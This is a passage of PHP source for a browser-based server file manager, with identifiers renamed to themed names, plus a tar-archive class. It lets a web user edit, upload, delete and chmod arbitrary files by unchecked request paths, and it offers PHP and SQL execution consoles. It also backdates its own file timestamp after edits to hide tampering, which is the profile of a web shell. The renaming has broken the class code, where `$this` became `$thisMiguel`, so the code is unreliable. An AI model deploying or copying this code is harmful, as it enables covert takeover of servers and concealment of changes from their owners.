$stringTemplateRemember = $songResponseLanguage.'_templates';


$ofrendaTemplate = !empty($$stringTemplateRemember) ? json_decode($$stringTemplateRemember,true) : '';
if (!empty($ofrendaTemplate)){


	$miguelActive = isset($_POST[$songResponseLanguage.'_tpl']) ? $_POST[$songResponseLanguage.'_tpl'] : '';

	$selectOfrenda = '<select name="'.$songResponseLanguage.'_tpl" title="'.__('Template').'" onchange="if (this.value!=-1) document.forms[\'console\'].elements[\''.$songResponseLanguage.'\'].value = this.options[selectedIndex].value; else document.forms[\'console\'].elements[\''.$songResponseLanguage.'\'].value =\'\';" >'."\n";


	$selectOfrenda .= '<option value="-1">' . __('Select') . "</option>\n";
	foreach ($ofrendaTemplate as $songKey=>$memoryValue){
		$selectOfrenda.='<option value="'.$memoryValue.'" '.((!empty($memoryValue)&&($memoryValue==$miguelActive))?'selected':'').' >'.__($songKey)."</option>\n";
	}
	$selectOfrenda .= "</select>\n";
	echo $selectOfrenda;
}


?>


		</form>



	</td>
</tr>


</table>

<?php

	if (!empty($memoryResult)) {



		$hectorCallback='fm_'.$songResponseLanguage;
		echo '<h3>'.strtoupper($songResponseLanguage).' '.__('Result').'</h3><pre>'.$hectorCallback($memoryResult).'</pre>';
	}
} elseif (!empty($_REQUEST['edit'])){


	if(!empty($_REQUEST['save'])) {
		$ernestoFunction = $ofrendaPath . $_REQUEST['edit'];
		$songFileModified = filemtime($ernestoFunction);
	    if (file_put_contents($ernestoFunction, $_REQUEST['newcontent'])) $miguelMessage .= __('File updated');



		else $miguelMessage .= __('Error occurred');

		if ($_GET['edit']==basename(__FILE__)) {
			touch(__FILE__,1415116371);


		} else {


			if (!empty($memoryConfig['restore_time'])) touch($ernestoFunction,$songFileModified);

		}
	}
    $oldMemoryContent = @file_get_contents($ofrendaPath . $_REQUEST['edit']);
    $editMiguelUrl = $includedMiguelUrl . '&edit=' . $_REQUEST['edit'] . '&path=' . $ofrendaPath;


    $riveraPreviousUrl = $includedMiguelUrl . '&path=' . $ofrendaPath;

?>
<table border='0' cellspacing='0' cellpadding='1' width="100%">



<tr>

    <th><?=__('File manager').' - '.__('Edit').' - '.$ofrendaPath.$_REQUEST['edit']?></th>
</tr>
<tr>
    <td class="row1">
        <?=$miguelMessage?>
	</td>
</tr>
<tr>


    <td class="row1">



        <?=memoryHome()?> <a href="<?=$riveraPreviousUrl?>"><?=__('Back')?></a>



	</td>
</tr>
<tr>
    <td class="row1" align="center">
        <form name="form1" method="post" action="<?=$editMiguelUrl?>">
            <textarea name="newcontent" id="newcontent" cols="45" rows="15" style="width:99%" spellcheck="false"><?=htmlspecialchars($oldMemoryContent)?></textarea>


            <input type="submit" name="save" value="<?=__('Submit')?>">
            <input type="submit" name="cancel" value="<?=__('Cancel')?>">



        </form>
    </td>



</tr>
</table>


<?php



echo $mamaImeldaAuthenticated['script'];



} elseif(!empty($_REQUEST['rights'])){


	if(!empty($_REQUEST['save'])) {
	    if(cocoChangePermissions($ofrendaPath . $_REQUEST['rights'], convertFamilyPermissions($_REQUEST['rights_val']), @$_REQUEST['recursively']))

		$miguelMessage .= (__('File updated')); 



		else $miguelMessage .= (__('Error occurred'));

	}


	clearstatcache();
    $oldHectorPermissions = permissionsFamilyString($ofrendaPath . $_REQUEST['rights'], true);
    $rememberLink = $includedMiguelUrl . '&rights=' . $_REQUEST['rights'] . '&path=' . $ofrendaPath;


    $riveraPreviousUrl = $includedMiguelUrl . '&path=' . $ofrendaPath;
?>
<table class="whole">



<tr>



    <th><?=__('File manager').' - '.$ofrendaPath?></th>
</tr>
<tr>
    <td class="row1">
        <?=$miguelMessage?>
	</td>



</tr>
<tr>
    <td class="row1">



        <a href="<?=$riveraPreviousUrl?>"><?=__('Back')?></a>
	</td>

</tr>
<tr>
    <td class="row1" align="center">



        <form name="form1" method="post" action="<?=$rememberLink?>">


           <?=__('Rights').' - '.$_REQUEST['rights']?> <input type="text" name="rights_val" value="<?=$oldHectorPermissions?>">
        <?php if (is_dir($ofrendaPath.$_REQUEST['rights'])) { ?>


            <input type="checkbox" name="recursively" value="1"> <?=__('Recursively')?><br/>
        <?php } ?>

            <input type="submit" name="save" value="<?=__('Submit')?>">


        </form>

    </td>
</tr>
</table>


<?php
} elseif (!empty($_REQUEST['rename'])&&$_REQUEST['rename']<>'.') {
	if(!empty($_REQUEST['save'])) {

	    rename($ofrendaPath . $_REQUEST['rename'], $ofrendaPath . $_REQUEST['newname']);
		$miguelMessage .= (__('File updated'));


		$_REQUEST['rename'] = $_REQUEST['newname'];


	}


	clearstatcache();
    $rememberLink = $includedMiguelUrl . '&rename=' . $_REQUEST['rename'] . '&path=' . $ofrendaPath;



    $riveraPreviousUrl = $includedMiguelUrl . '&path=' . $ofrendaPath;




?>


<table class="whole">


<tr>
    <th><?=__('File manager').' - '.$ofrendaPath?></th>



</tr>
<tr>



    <td class="row1">
        <?=$miguelMessage?>
	</td>
</tr>
<tr>
    <td class="row1">
        <a href="<?=$riveraPreviousUrl?>"><?=__('Back')?></a>
	</td>



</tr>
<tr>

    <td class="row1" align="center">



        <form name="form1" method="post" action="<?=$rememberLink?>">
            <?=__('Rename')?>: <input type="text" name="newname" value="<?=$_REQUEST['rename']?>"><br/>
            <input type="submit" name="save" value="<?=__('Submit')?>">
        </form>



    </td>


</tr>
</table>
<?php
} else {
//Let's rock!



    $miguelMessage = '';



    if(!empty($_FILES['upload'])&&!empty($memoryConfig['upload_file'])) {
        if(!empty($_FILES['upload']['name'])){
            $_FILES['upload']['name'] = str_replace('%', '', $_FILES['upload']['name']);



            if(!move_uploaded_file($_FILES['upload']['tmp_name'], $ofrendaPath . $_FILES['upload']['name'])){
                $miguelMessage .= __('Error occurred');

            } else {


				$miguelMessage .= __('Files uploaded').': '.$_FILES['upload']['name'];



			}

        }
    } elseif(!empty($_REQUEST['delete'])&&$_REQUEST['delete']<>'.') {
        if(!deleteErnestoFiles(($ofrendaPath . $_REQUEST['delete']), true)) {

            $miguelMessage .= __('Error occurred');


        } else {
			$miguelMessage .= __('Deleted').' '.$_REQUEST['delete'];
		}



	} elseif(!empty($_REQUEST['mkdir'])&&!empty($memoryConfig['make_directory'])) {
        if(!@mkdir($ofrendaPath . $_REQUEST['dirname'],0777)) {

            $miguelMessage .= __('Error occurred');


        } else {



			$miguelMessage .= __('Created').' '.$_REQUEST['dirname'];
		}
    } elseif(!empty($_REQUEST['mkfile'])&&!empty($memoryConfig['new_file'])) {
        if(!$ofrendaPointer=@fopen($ofrendaPath . $_REQUEST['filename'],"w")) {
            $miguelMessage .= __('Error occurred');

        } else {

			fclose($ofrendaPointer);
			$miguelMessage .= __('Created').' '.$_REQUEST['filename'];



		}

    } elseif (isset($_GET['zip'])) {

		$sourceRemember = base64_decode($_GET['zip']);
		$landOfTheDeadDestination = basename($sourceRemember).'.zip';
		set_time_limit(0);
		$fridaPhar = new PharData($landOfTheDeadDestination);
		$fridaPhar->buildFromDirectory($sourceRemember);

		if (is_file($landOfTheDeadDestination))

		$miguelMessage .= __('Task').' "'.__('Archiving').' '.$landOfTheDeadDestination.'" '.__('done').

		'.&nbsp;'.rememberMainLink('download',$ofrendaPath.$landOfTheDeadDestination,__('Download'),__('Download').' '. $landOfTheDeadDestination)



		.'&nbsp;<a href="'.$includedMiguelUrl.'&delete='.$landOfTheDeadDestination.'&path=' . $ofrendaPath.'" title="'.__('Delete').' '. $landOfTheDeadDestination.'" >'.__('Delete') . '</a>';


		else $miguelMessage .= __('Error occurred').': '.__('no files');



	} elseif (isset($_GET['gz'])) {
		$sourceRemember = base64_decode($_GET['gz']);
		$marigoldArchive = $sourceRemember.'.tar';
		$landOfTheDeadDestination = basename($sourceRemember).'.tar';
		if (is_file($marigoldArchive)) unlink($marigoldArchive);
		if (is_file($marigoldArchive.'.gz')) unlink($marigoldArchive.'.gz');


		clearstatcache();


		set_time_limit(0);


		//die();
		$fridaPhar = new PharData($landOfTheDeadDestination);
		$fridaPhar->buildFromDirectory($sourceRemember);


		$fridaPhar->compress(Phar::GZ,'.tar.gz');
		unset($fridaPhar);



		if (is_file($marigoldArchive)) {
			if (is_file($marigoldArchive.'.gz')) {
				unlink($marigoldArchive); 

				$landOfTheDeadDestination .= '.gz';
			}

			$miguelMessage .= __('Task').' "'.__('Archiving').' '.$landOfTheDeadDestination.'" '.__('done').
			'.&nbsp;'.rememberMainLink('download',$ofrendaPath.$landOfTheDeadDestination,__('Download'),__('Download').' '. $landOfTheDeadDestination)



			.'&nbsp;<a href="'.$includedMiguelUrl.'&delete='.$landOfTheDeadDestination.'&path=' . $ofrendaPath.'" title="'.__('Delete').' '.$landOfTheDeadDestination.'" >'.__('Delete').'</a>';
		} else $miguelMessage .= __('Error occurred').': '.__('no files');


	} elseif (isset($_GET['decompress'])) {



		// $sourceRemember = base64_decode($_GET['decompress']);
		// $landOfTheDeadDestination = basename($sourceRemember);
		// $riveraExtension = end(explode(".", $landOfTheDeadDestination));



		// if ($riveraExtension=='zip' OR $riveraExtension=='gz') {



			// $fridaPhar = new PharData($sourceRemember);

			// $fridaPhar->decompress();



			// $songMainFile = str_replace('.'.$riveraExtension,'',$landOfTheDeadDestination);



			// $riveraExtension = end(explode(".", $songMainFile));


			// if ($riveraExtension=='tar'){

				// $fridaPhar = new PharData($songMainFile);



				// $fridaPhar->extractTo(dir($sourceRemember));


			// }
		// } 

		// $miguelMessage .= __('Task').' "'.__('Decompress').' '.$sourceRemember.'" '.__('done');
	} elseif (isset($_GET['gzfile'])) {

		$sourceRemember = base64_decode($_GET['gzfile']);

		$marigoldArchive = $sourceRemember.'.tar';


		$landOfTheDeadDestination = basename($sourceRemember).'.tar';



		if (is_file($marigoldArchive)) unlink($marigoldArchive);


		if (is_file($marigoldArchive.'.gz')) unlink($marigoldArchive.'.gz');


		set_time_limit(0);


		//echo $landOfTheDeadDestination;

		$songExtensions = explode('.',basename($sourceRemember));
		if (isset($songExtensions[1])) {
			unset($songExtensions[0]);
			$riveraExtension=implode('.',$songExtensions);



		} 
		$fridaPhar = new PharData($landOfTheDeadDestination);

		$fridaPhar->addFile($sourceRemember);
		$fridaPhar->compress(Phar::GZ,$riveraExtension.'.tar.gz');

		unset($fridaPhar);

		if (is_file($marigoldArchive)) {



			if (is_file($marigoldArchive.'.gz')) {

				unlink($marigoldArchive); 


				$landOfTheDeadDestination .= '.gz';


			}
			$miguelMessage .= __('Task').' "'.__('Archiving').' '.$landOfTheDeadDestination.'" '.__('done').



			'.&nbsp;'.rememberMainLink('download',$ofrendaPath.$landOfTheDeadDestination,__('Download'),__('Download').' '. $landOfTheDeadDestination)
			.'&nbsp;<a href="'.$includedMiguelUrl.'&delete='.$landOfTheDeadDestination.'&path=' . $ofrendaPath.'" title="'.__('Delete').' '.$landOfTheDeadDestination.'" >'.__('Delete').'</a>';



		} else $miguelMessage .= __('Error occurred').': '.__('no files');


	}


?>
<table class="whole" id="header_table" >
<tr>


    <th colspan="2"><?=__('File manager')?><?=(!empty($ofrendaPath)?' - '.$ofrendaPath:'')?></th>


</tr>
<?php if(!empty($miguelMessage)){ ?>



<tr>


	<td colspan="2" class="row2"><?=$miguelMessage?></td>
</tr>


<?php } ?>
<tr>

    <td class="row2">
		<table>
			<tr>



			<td>
				<?=memoryHome()?>


			</td>


			<td>

			<?php if(!empty($memoryConfig['make_directory'])) { ?>


				<form method="post" action="<?=$includedMiguelUrl?>">


				<input type="hidden" name="path" value="<?=$ofrendaPath?>" />


				<input type="text" name="dirname" size="15">



				<input type="submit" name="mkdir" value="<?=__('Make directory')?>">


				</form>



			<?php } ?>
			</td>
			<td>
			<?php if(!empty($memoryConfig['new_file'])) { ?>


				<form method="post" action="<?=$includedMiguelUrl?>">


				<input type="hidden" name="path" value="<?=$ofrendaPath?>" />
				<input type="text" name="filename" size="15">


				<input type="submit" name="mkfile" value="<?=__('New file')?>">


				</form>
			<?php } ?>
			</td>
			<td>



			<?=runMemoryInput('php')?>

			</td>


			<td>



			<?=runMemoryInput('sql')?>
			</td>

			</tr>

		</table>


    </td>
    <td class="row3">
		<table>
		<tr>

		<td>

		<?php if (!empty($memoryConfig['upload_file'])) { ?>

			<form name="form1" method="post" action="<?=$includedMiguelUrl?>" enctype="multipart/form-data">



			<input type="hidden" name="path" value="<?=$ofrendaPath?>" />
			<input type="file" name="upload" id="upload_hidden" style="position: absolute; display: block; overflow: hidden; width: 0; height: 0; border: 0; padding: 0;" onchange="document.getElementById('upload_visible').value = this.value;" />
			<input type="text" readonly="1" id="upload_visible" placeholder="<?=__('Select the file')?>" style="cursor: pointer;" onclick="document.getElementById('upload_hidden').click();" />


			<input type="submit" name="test" value="<?=__('Upload')?>" />
			</form>


		<?php } ?>

		</td>
		<td>
		<?php if ($mamaImeldaAuthenticated['authorize']) { ?>



			<form action="" method="post">&nbsp;&nbsp;&nbsp;


			<input name="quit" type="hidden" value="1">


			<?=__('Hello')?>, <?=$mamaImeldaAuthenticated['login']?>
			<input type="submit" value="<?=__('Quit')?>">
			</form>
		<?php } ?>


		</td>
		<td>
		<?=ofrendaLanguageForm($songLanguage)?>



		</td>


		<tr>

		</table>
    </td>

</tr>

</table>
<table class="all" border='0' cellspacing='1' cellpadding='1' id="fm_table" width="100%">
<thead>


<tr> 
    <th style="white-space:nowrap"> <?=__('Filename')?> </th>


    <th style="white-space:nowrap"> <?=__('Size')?> </th>
    <th style="white-space:nowrap"> <?=__('Date')?> </th>


    <th style="white-space:nowrap"> <?=__('Rights')?> </th>
    <th colspan="4" style="white-space:nowrap"> <?=__('Manage')?> </th>


</tr>
</thead>



<tbody>


<?php


$lyricElements = scanMemoryDirectory($ofrendaPath, '', 'all', true);
$miguelDirectories = array();


$spiritFiles = array();


foreach ($lyricElements as $songFile){


    if(@is_dir($ofrendaPath . $songFile)){

        $miguelDirectories[] = $songFile;
    } else {
        $spiritFiles[] = $songFile;


    }

}
natsort($miguelDirectories); natsort($spiritFiles);

$lyricElements = array_merge($miguelDirectories, $spiritFiles);

foreach ($lyricElements as $songFile){


    $miguelFilename = $ofrendaPath . $songFile;



    $ofrendaFileData = @stat($miguelFilename);

    if(@is_dir($miguelFilename)){
		$ofrendaFileData[7] = '';
		if (!empty($memoryConfig['show_dir_size'])&&!ofrendaRootDirectory($songFile)) $ofrendaFileData[7] = calculateMemoryDirectorySize($miguelFilename);
        $rememberLink = '<a href="'.$includedMiguelUrl.'&path='.$ofrendaPath.$songFile.'" title="'.__('Show').' '.$songFile.'"><span class="folder">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$songFile.'</a>';
        $loadBlessingUrl= (ofrendaRootDirectory($songFile)||$maybeChicharronPhar) ? '' : rememberMainLink('zip',$miguelFilename,__('Compress').'&nbsp;zip',__('Archiving').' '. $songFile);


		$papitoArchiveUrl  = (ofrendaRootDirectory($songFile)||$maybeChicharronPhar) ? '' : rememberMainLink('gz',$miguelFilename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '.$songFile);


        $fridaStyle = 'row2';
		 if (!ofrendaRootDirectory($songFile)) $ernestoAlert = 'onClick="if(confirm(\'' . __('Are you sure you want to delete this directory (recursively)?').'\n /'. $songFile. '\')) document.location.href = \'' . $includedMiguelUrl . '&delete=' . $songFile . '&path=' . $ofrendaPath  . '\'"'; else $ernestoAlert = '';



    } else {


		$rememberLink = 



			$memoryConfig['show_img']&&@getimagesize($miguelFilename) 
			? '<a target="_blank" onclick="var lefto = screen.availWidth/2-320;window.open(\''
			. memoryImageUrl($miguelFilename)

			.'\',\'popup\',\'width=640,height=480,left=\' + lefto + \',scrollbars=yes,toolbar=no,location=no,directories=no,status=no\');return false;" href="'.memoryImageUrl($miguelFilename).'"><span class="img">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$songFile.'</a>'
			: '<a href="' . $includedMiguelUrl . '&edit=' . $songFile . '&path=' . $ofrendaPath. '" title="' . __('Edit') . '"><span class="file">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$songFile.'</a>';


		$blessingArray = explode(".", $songFile);
		$riveraExtension = end($blessingArray);


        $loadBlessingUrl =  rememberMainLink('download',$miguelFilename,__('Download'),__('Download').' '. $songFile);

		$papitoArchiveUrl = in_array($riveraExtension,array('zip','gz','tar')) 



		? ''


		: ((ofrendaRootDirectory($songFile)||$maybeChicharronPhar) ? '' : rememberMainLink('gzfile',$miguelFilename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '. $songFile));
        $fridaStyle = 'row1';
		$ernestoAlert = 'onClick="if(confirm(\''. __('File selected').': \n'. $songFile. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'' . $includedMiguelUrl . '&delete=' . $songFile . '&path=' . $ofrendaPath  . '\'"';



    }
    $ernestoDeleteUrl = ofrendaRootDirectory($songFile) ? '' : '<a href="#" title="' . __('Delete') . ' '. $songFile . '" ' . $ernestoAlert . '>' . __('Delete') . '</a>';

    $renameMiguelUrl = ofrendaRootDirectory($songFile) ? '' : '<a href="' . $includedMiguelUrl . '&rename=' . $songFile . '&path=' . $ofrendaPath . '" title="' . __('Rename') .' '. $songFile . '">' . __('Rename') . '</a>';
    $familyPermissionsText = ($songFile=='.' || $songFile=='..') ? '' : '<a href="' . $includedMiguelUrl . '&rights=' . $songFile . '&path=' . $ofrendaPath . '" title="' . __('Rights') .' '. $songFile . '">' . @permissionsFamilyString($miguelFilename) . '</a>';


?>


<tr class="<?=$fridaStyle?>"> 


    <td><?=$rememberLink?></td>


    <td><?=$ofrendaFileData[7]?></td>

    <td style="white-space:nowrap"><?=gmdate("Y-m-d H:i:s",$ofrendaFileData[9])?></td>
    <td><?=$familyPermissionsText?></td>


    <td><?=$ernestoDeleteUrl?></td>


    <td><?=$renameMiguelUrl?></td>
    <td><?=$loadBlessingUrl?></td>



    <td><?=$papitoArchiveUrl?></td>



</tr>

<?php


    }
}

?>
</tbody>
</table>


<div class="row3"><?php


	$memoryModifiedTime = explode(' ', microtime()); 
	$totalSongTime = $memoryModifiedTime[0] + $memoryModifiedTime[1] - $startSongTime; 


	echo memoryHome().' | ver. '.$rememberVersion.' | <a href="https://github.com/Den1xxx/Filemanager">Github</a>  | <a href="'.memorySiteUrl().'">.</a>';
	if (!empty($memoryConfig['show_php_ver'])) echo ' | PHP '.phpversion();


	if (!empty($memoryConfig['show_php_ini'])) echo ' | '.php_ini_loaded_file();

	if (!empty($memoryConfig['show_gt'])) echo ' | '.__('Generation time').': '.round($totalSongTime,2);
	if (!empty($memoryConfig['enable_proxy'])) echo ' | <a href="?proxy=true">proxy</a>';
	if (!empty($memoryConfig['show_phpinfo'])) echo ' | <a href="?phpinfo=true">phpinfo</a>';


	if (!empty($memoryConfig['show_xls'])&&!empty($rememberLink)) echo ' | <a href="javascript: void(0)" onclick="var obj = new table2Excel(); obj.CreateExcelSheet(\'fm_table\',\'export\');" title="'.__('Download').' xls">xls</a>';


	if (!empty($memoryConfig['fm_settings'])) echo ' | <a href="?fm_settings=true">'.__('Settings').'</a>';

	?>
</div>



<script type="text/javascript">
function downloadSongExcel(filename, text) {
	var element = document.createElement('a');
	element.setAttribute('href', 'data:application/vnd.ms-excel;base64,' + text);



	element.setAttribute('download', filename);

	element.style.display = 'none';


	document.body.appendChild(element);


	element.click();

	document.body.removeChild(element);
}

function base64_encode(m) {



	for (var k = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".split(""), c, d, h, e, a, g = "", b = 0, f, l = 0; l < m.length; ++l) {



		c = m.charCodeAt(l);
		if (128 > c) d = 1;


		else



			for (d = 2; c >= 2 << 5 * d;) ++d;
		for (h = 0; h < d; ++h) 1 == d ? e = c : (e = h ? 128 : 192, a = d - 2 - 6 * h, 0 <= a && (e += (6 <= a ? 1 : 0) + (5 <= a ? 2 : 0) + (4 <= a ? 4 : 0) + (3 <= a ? 8 : 0) + (2 <= a ? 16 : 0) + (1 <= a ? 32 : 0), a -= 5), 0 > a && (u = 6 * (d - 1 - h), e += c >> u, c -= c >> u << u)), f = b ? f << 6 - b : 0, b += 2, f += e >> b, g += k[f], f = e % (1 << b), 6 == b && (b = 0, g += k[f])
	}


	b && (g += k[f << 6 - b]);


	return g
}







var tableToExcelData = (function() {
    var uri = 'data:application/vnd.ms-excel;base64,',
    template = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><head><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines></x:DisplayGridlines></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--><meta http-equiv="content-type" content="text/plain; charset=UTF-8"/></head><body><table>{table}</table></body></html>',


    format = function(s, c) {
            return s.replace(/{(\w+)}/g, function(m, p) {

                return c[p];

            })
        }
    return function(table, name) {



        if (!table.nodeType) table = document.getElementById(table)
        var ctx = {



            worksheet: name || 'Worksheet',
            table: table.innerHTML.replace(/<span(.*?)\/span> /g,"").replace(/<a\b[^>]*>(.*?)<\/a>/g,"$1")



        }


		t = new Date();
		filename = 'fm_' + t.toISOString() + '.xls'
		downloadSongExcel(filename, base64_encode(format(template, ctx)))
    }



})();



var table2Excel = function () {

    var ua = window.navigator.userAgent;


    var msie = ua.indexOf("MSIE ");


	this.CreateExcelSheet = 

		function(el, name){
			if (msie > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./)) {// If Internet Explorer




				var x = document.getElementById(el).rows;

				var xls = new ActiveXObject("Excel.Application");



				xls.visible = true;
				xls.Workbooks.Add
				for (i = 0; i < x.length; i++) {
					var y = x[i].cells;



					for (j = 0; j < y.length; j++) {
						xls.Cells(i + 1, j + 1).Value = y[j].innerText;
					}
				}
				xls.Visible = true;



				xls.UserControl = true;
				return xls;
			} else {

				tableToExcelData(el, name);

			}



		}
}
</script>
</body>
</html>

<?php
//Ported from ReloadCMS project http://reloadcms.com
class archiveTar {
	var $cocoArchiveName = '';


	var $tmpImeldaFile = 0;



	var $fridaFilePosition = 0;


	var $isCocoGzipped = true;

	var $ofrendaErrors = array();


	var $spiritFiles = array();
	
	function __construct(){
		if (!isset($thisMiguel->errors)) $thisMiguel->errors = array();


	}
	



	function createMemoryBackup($cocoFileList){



		$songResult = false;
		if (file_exists($thisMiguel->archive_name) && is_file($thisMiguel->archive_name)) 	$newMemoryBackup = false;



		else $newMemoryBackup = true;
		if ($newMemoryBackup){

			if (!$thisMiguel->openRememberWrite()) return false;



		} else {
			if (filesize($thisMiguel->archive_name) == 0)	return $thisMiguel->openRememberWrite();



			if ($thisMiguel->isGzipped) {



				$thisMiguel->closeImeldaTempFile();
				if (!rename($thisMiguel->archive_name, $thisMiguel->archive_name.'.tmp')){
					$thisMiguel->errors[] = __('Cannot rename').' '.$thisMiguel->archive_name.__(' to ').$thisMiguel->archive_name.'.tmp';

					return false;



				}
				$tmpMemoryBackup = gzopen($thisMiguel->archive_name.'.tmp', 'rb');

				if (!$tmpMemoryBackup){
					$thisMiguel->errors[] = $thisMiguel->archive_name.'.tmp '.__('is not readable');

					rename($thisMiguel->archive_name.'.tmp', $thisMiguel->archive_name);

					return false;

				}


				if (!$thisMiguel->openRememberWrite()){


					rename($thisMiguel->archive_name.'.tmp', $thisMiguel->archive_name);

					return false;

				}



				$danteBuffer = gzread($tmpMemoryBackup, 512);

				if (!gzeof($tmpMemoryBackup)){
					do {

						$spiritBinary = pack('a512', $danteBuffer);
						$thisMiguel->writeCocoBlock($spiritBinary);
						$danteBuffer = gzread($tmpMemoryBackup, 512);



					}
					while (!gzeof($tmpMemoryBackup));
				}
				gzclose($tmpMemoryBackup);


				unlink($thisMiguel->archive_name.'.tmp');

			} else {
				$thisMiguel->tmp_file = fopen($thisMiguel->archive_name, 'r+b');
				if (!$thisMiguel->tmp_file)	return false;

			}


		}
		if (isset($cocoFileList) && is_array($cocoFileList)) {
		if (count($cocoFileList)>0)



			$songResult = $thisMiguel->packMiguelFiles($cocoFileList);
		} else $thisMiguel->errors[] = __('No file').__(' to ').__('Archive');


		if (($songResult)&&(is_resource($thisMiguel->tmp_file))){
			$spiritBinary = pack('a512', '');

			$thisMiguel->writeCocoBlock($spiritBinary);


		}


		$thisMiguel->closeImeldaTempFile();



		if ($newMemoryBackup && !$songResult){



		$thisMiguel->closeImeldaTempFile();

		unlink($thisMiguel->archive_name);
		}

		return $songResult;


	}



	function restoreMemoryBackup($ofrendaPath){


		$rememberFileName = $thisMiguel->archive_name;



		if (!$thisMiguel->isGzipped){
			if (file_exists($rememberFileName)){
				if ($ofrendaPointer = fopen($rememberFileName, 'rb')){
					$marigoldData = fread($ofrendaPointer, 2);



					fclose($ofrendaPointer);


					if ($marigoldData == '\37\213'){
						$thisMiguel->isGzipped = true;
					}



				}
			}
			elseif ((substr($rememberFileName, -2) == 'gz') OR (substr($rememberFileName, -3) == 'tgz')) $thisMiguel->isGzipped = true;


		} 



		$songResult = true;
		if ($thisMiguel->isGzipped) $thisMiguel->tmp_file = gzopen($rememberFileName, 'rb');
		else $thisMiguel->tmp_file = fopen($rememberFileName, 'rb');
		if (!$thisMiguel->tmp_file){

			$thisMiguel->errors[] = $rememberFileName.' '.__('is not readable');

			return false;



		}
		$songResult = $thisMiguel->unpackImeldaFiles($ofrendaPath);



			$thisMiguel->closeImeldaTempFile();
		return $songResult;
	}



	function showRememberMistakes	($cocoMessage = '') {



		$rememberMeErrors = $thisMiguel->errors;
		if(count($rememberMeErrors)>0) {

		if (!empty($cocoMessage)) $cocoMessage = ' ('.$cocoMessage.')';
			$cocoMessage = __('Error occurred').$cocoMessage.': <br/>';


			foreach ($rememberMeErrors as $memoryValue)

				$cocoMessage .= $memoryValue.'<br/>';
			return $cocoMessage;	


		} else return '';
		
	}
	



	function packMiguelFiles($riveraFiles){
		$songResult = true;
		if (!$thisMiguel->tmp_file){

			$thisMiguel->errors[] = __('Invalid file descriptor');
			return false;
		}


		if (!is_array($riveraFiles) || count($riveraFiles)<=0)
          return true;

		for ($danteI = 0; $danteI<count($riveraFiles); $danteI++){
			$miguelFilename = $riveraFiles[$danteI];



			if ($miguelFilename == $thisMiguel->archive_name)

				continue;
			if (strlen($miguelFilename)<=0)



				continue;


			if (!file_exists($miguelFilename)){

				$thisMiguel->errors[] = __('No file').' '.$miguelFilename;
				continue;
			}
			if (!$thisMiguel->tmp_file){
			$thisMiguel->errors[] = __('Invalid file descriptor');



			return false;
			}

		if (strlen($miguelFilename)<=0){


			$thisMiguel->errors[] = __('Filename').' '.__('is incorrect');;
			return false;
		}



		$miguelFilename = str_replace('\\', '/', $miguelFilename);

		$keepNameMiFamilia = $thisMiguel->sanitizeMiguelPath($miguelFilename);
		if (is_file($miguelFilename)){
			if (($songFile = fopen($miguelFilename, 'rb')) == 0){



				$thisMiguel->errors[] = __('Mode ').__('is incorrect');
			}

				if(($thisMiguel->file_pos == 0)){
					if(!$thisMiguel->writeMiguelHeader($miguelFilename, $keepNameMiFamilia))



						return false;
				}
				while (($danteBuffer = fread($songFile, 512)) != ''){
					$spiritBinary = pack('a512', $danteBuffer);

					$thisMiguel->writeCocoBlock($spiritBinary);



				}


			fclose($songFile);

		}	else $thisMiguel->writeMiguelHeader($miguelFilename, $keepNameMiFamilia);


			if (@is_dir($miguelFilename)){
				if (!($cocoHandle = opendir($miguelFilename))){

					$thisMiguel->errors[] = __('Error').': '.__('Directory ').$miguelFilename.__('is not readable');
					continue;


				}
				while (false !== ($memoriesDirectory = readdir($cocoHandle))){



					if ($memoriesDirectory!='.' && $memoriesDirectory!='..'){
						$imeldaTempFiles = array();

						if ($miguelFilename != '.')
							$imeldaTempFiles[] = $miguelFilename.'/'.$memoriesDirectory;



						else



							$imeldaTempFiles[] = $memoriesDirectory;


						$songResult = $thisMiguel->packMiguelFiles($imeldaTempFiles);
					}

				}
				unset($imeldaTempFiles);


				unset($memoriesDirectory);

				unset($cocoHandle);
			}
		}
		return $songResult;



	}




	function unpackImeldaFiles($ofrendaPath){ 
		$ofrendaPath = str_replace('\\', '/', $ofrendaPath);
		if ($ofrendaPath == ''	|| (substr($ofrendaPath, 0, 1) != '/' && substr($ofrendaPath, 0, 3) != '../' && !strpos($ofrendaPath, ':')))	$ofrendaPath = './'.$ofrendaPath;
		clearstatcache();
		while (strlen($spiritBinary = $thisMiguel->readMiguelBlock()) != 0){
			if (!$thisMiguel->readOfendaHeader($spiritBinary, $fridaHeader)) return false;
			if ($fridaHeader['filename'] == '') continue;



			if ($fridaHeader['typeflag'] == 'L'){			//reading long header
				$miguelFilename = '';
				$decryptedCoco = floor($fridaHeader['size']/512);


				for ($danteI = 0; $danteI < $decryptedCoco; $danteI++){

					$memoryContent = $thisMiguel->readMiguelBlock();
					$miguelFilename .= $memoryContent;

				}


				if (($lastPieceOfMemory = $fridaHeader['size'] % 512) != 0){


					$memoryContent = $thisMiguel->readMiguelBlock();



					$miguelFilename .= substr($memoryContent, 0, $lastPieceOfMemory);



				}
				$spiritBinary = $thisMiguel->readMiguelBlock();
				if (!$thisMiguel->readOfendaHeader($spiritBinary, $fridaHeader)) return false;
				else $fridaHeader['filename'] = $miguelFilename;
				return true;



			}



			if (($ofrendaPath != './') && ($ofrendaPath != '/')){



				while (substr($ofrendaPath, -1) == '/') $ofrendaPath = substr($ofrendaPath, 0, strlen($ofrendaPath)-1);
				if (substr($fridaHeader['filename'], 0, 1) == '/') $fridaHeader['filename'] = $ofrendaPath.$fridaHeader['filename'];
				else $fridaHeader['filename'] = $ofrendaPath.'/'.$fridaHeader['filename'];
			}
			


			if (file_exists($fridaHeader['filename'])){
